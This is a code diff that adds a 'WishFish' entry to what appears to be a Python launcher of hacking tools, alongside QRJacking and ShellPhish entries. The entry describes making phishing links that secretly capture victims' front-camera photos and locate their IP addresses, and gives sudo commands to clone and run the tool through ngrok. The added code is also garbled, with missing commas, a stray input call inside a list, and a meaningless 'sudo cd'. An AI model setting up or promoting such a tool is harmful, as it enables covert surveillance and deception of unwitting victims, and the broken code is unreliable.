@@ -90,7 +90,23 @@ class QRJacking(HackingTool):
     RUN_COMMANDS = ["cd ohmyqr && sudo bash ohmyqr.sh"]
     PROJECT_URL = "https://github.com/cryptedwolf/ohmyqr"
 
-
+class WishFish(HackingTool):
+    TITLE = "WishFish"
+    DESCRIPTION = "Using WishFish tool you can generat different phishing links of wishing or custom sites which can grab victim front camera pictures and also gives you lockup information of target ip address"
+                  "[!] You should  download ngrok and extract the ngrok " \
+                  " An created on account on ngrok  you got a auth key you have to past on ngrok \n" \
+                  "[!]  Type a command " \
+                  "./ngrok authtoken Your_auth_token "
+                  "./ngrok http 80"
+            "then ngrok server will run and host on https and http "
+    INSTALL_COMMANDS = ["sudo su"
+        "git clone https://github.com/kinghacker0/WishFish.git"
+                        "sudo cd WishFish"]
+    RUN_COMMANDS = ["sudo bash wishfish.sh"
+                    input("")
+                    "chmod +x copy.sh && ./copy.sh"]
+    PROJECT_URL = "https://github.com/kinghacker0/WishFish"
+    
 class ShellPhish(HackingTool):
     TITLE = "ShellPhish"
     DESCRIPTION = "Fhishing Tool for 18 social media"
